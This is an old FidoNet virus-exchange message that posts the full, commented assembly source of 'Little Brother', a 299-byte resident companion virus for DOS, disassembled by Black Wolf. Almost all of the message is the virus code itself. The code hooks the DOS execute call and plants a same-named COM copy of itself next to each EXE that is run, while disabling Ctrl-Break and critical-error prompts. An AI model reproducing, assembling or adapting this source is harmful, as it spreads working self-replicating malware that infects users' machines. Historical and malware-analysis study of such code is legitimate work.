;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 37 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : LTBRO299.DSM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Alan Jones, 2:283/718 (06 Nov 94 17:40)
;* To   : Daniel Hendry
;* Subj : LTBRO299.DSM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Alan.Jones@f718.n283.z2.fidonet.org
;Little Brother - resident companion virus, 299 bytes.

;This virus stores itself inside DOS's data block, over the root directory
;copy.  It hooks int 21h, function 4bh (subfunct. 0, load & exec) and
;creates a function 0deh for self identification.  When a file is run,
;it first checks to see if it is a COM or an EXE.  If it is an EXE, it
;will create a COM file with the same filename.  Otherwise - if it is a
;COM, it will check to see if it is the virus by checking the size of the
;file and seeing if there is an EXE with the same (starting) filename.
;If so, it will change the filename to be run to the EXE host and allow
;DOS to execute it.  This virus may cause errors (?) due to the place
;in memory it locates itself.

;Disassembly by Black Wolf.

.model tiny
.code
     org     100h

start_virus:
     cld
     mov     ax,0DEDEh            ;Installation Check
     int     21h
     cmp     ah,41h
     je      Exit_Virus           ;If there - terminate

     mov     ax,44h
     mov     es,ax
     mov     di,100h                   ;Copy virus to 0044:0100
     mov     si,di                     ;Root directory entries?
     mov     cx,end_virus-start_virus  ;This is inside DOS data
     rep     movsb                     ;block... may cause errors?

     mov     ds,cx                ;DS = 0 = Interrupt table
     mov     si,84h               ;0:84h = Int 21h entry in table

     mov     di,offset Old21_IP   ;Save old Int 21h address
     movsw
     movsw

     push    es
     pop     ds                   ;Set DS to new seg...

     mov     dx,offset Int21_Handler
     mov     ax,2521h
     int     21h                  ;Hook Int 21h.

Exit_Virus:
     retn                         ;Terminate


EXE_Mask        db      'EXE',0
COM_Mask        db      'COM',0

CritErrHandler:
     mov     al,3
     iret

Int21_Handler:
     pushf
     cmp     ax,0DEDEh               ;Is this an installation
     je      Install_Check           ;check call?

     push    dx bx ax ds es          ;Save regs....

     cmp     ax,4B00h                ;Is it load and execute?
     jne     Exit_21h                ;No... exit handler
     call    Infect_File             ;Yes... infect file

Exit_21h:
     pop     es ds ax bx dx
     popf
     jmp     dword ptr cs:[Old21_IP]     ;Jump to Old Int 21h

Install_Check:
     mov     ax,4101h
     popf
     iret

Infect_File:
     cld
     mov     word ptr cs:[Filename_off],dx  ;Save filename offset
     mov     word ptr cs:[Filename_seg],ds  ;and segment.
     push    cs
     pop     ds
     mov     dx,offset VirusDTA
     mov     ah,1Ah
     int     21h                     ;Set DTA to us...

     call    Find_Extension

     mov     si,offset ds:[EXE_Mask]
     mov     cx,3
     repe    cmpsb                   ;Is it an EXE file?
     jnz     Not_EXE

     mov     si,offset COM_Mask
     call    Change_Ext              ;Change extension to COM

     mov     ax,3300h
     int     21h                     ;Get Ctrl-Break Status
     push    dx                      ;Save it....

     xor     dl,dl
     mov     ax,3301h
     int     21h                     ;Disable Ctrl-Break.

     mov     ax,3524h
     int     21h                     ;Get Int 24h handler's address

     push    bx
     push    es                      ;Save it for later...

     push    cs
     pop     ds                      ;DS = virus segment

     mov     dx,offset CritErrHandler
     mov     ax,2524h
     int     21h                     ;Set Critical Error handler.


     lds     dx,dword ptr ds:[Filename_Off]    ;DS:DX = filename
     xor     cx,cx                             ;Reg attributes
     mov     ah,5Bh
     int     21h                               ;Create File..
     jc      Done_Infect

     xchg    ax,bx
     push    cs
     pop     ds

     mov     cx,end_virus-start_virus
     mov     dx,100h
     mov     ah,40h
     int     21h                     ;Write entire virus

     cmp     ax,cx                   ;did it all write?

     pushf
     mov     ah,3Eh                  ;Close file.
     int     21h
     popf

     jz      Done_Infect             ;Yes, go Done_Infect

     lds     dx,dword ptr ds:[Filename_Off]
     mov     ah,41h
     int     21h                     ;Delete file, incomplete
                     ;write or write error.

Done_Infect:
     pop     ds
     pop     dx
     mov     ax,2524h
     int     21h                 ;Restore Critical error handler

     pop     dx                  ;Get old CTRL-Break handler
     mov     ax,3301h            ;status and restore it.
     int     21h

     mov     si,offset EXE_Mask
     call    Change_Ext          ;Change extension back to orig.

Leave_Infect:
     retn

Not_EXE:
     call    Locate_File
     cmp     word ptr cs:[24dh], end_virus-start_virus
     jne     Leave_Infect    ;Is the file size right for Virus?

     mov     si,offset EXE_Mask     ;If so, is there an EXE of the same
     call    Change_Ext            ;name as the COM file?
     call    Locate_File
     jnc     Leave_Infect          ;If not exit, otherwise - is already
     mov     si,offset COM_Mask    ;infected, so change extension
     jmp     short Change_Ext      ;to run uninfected program.


Locate_File:
     lds     dx,dword ptr ds:[Filename_Off]
     mov     cl,27h
     mov     ah,4Eh
     int     21h                     ;Find First Filename match.
     retn


Change_Ext:
     call    Find_Extension
     push    cs
     pop     ds
     movsw
     movsw
     retn

Find_Extension:
     les     di,dword ptr cs:[Filename_Off]
     mov     ch,0FFh
     mov     al,2Eh        ;Scan through filename until a '.'
     repne   scasb
     retn

Virus_Name      db      'Little Brother',0

end_virus:

Old21_IP        dw      ?
Old21_CS        dw      ?

Filename_Off    dw      ?
Filename_Seg    dw      ?

VirusDTA:
end     start_virus

;-+-  FMail 0.96โ
; + Origin: **SERMEDITECH BBS** Soissons FR (+33) 23.73.02.51 (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/v            Include full symbolic debug information
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

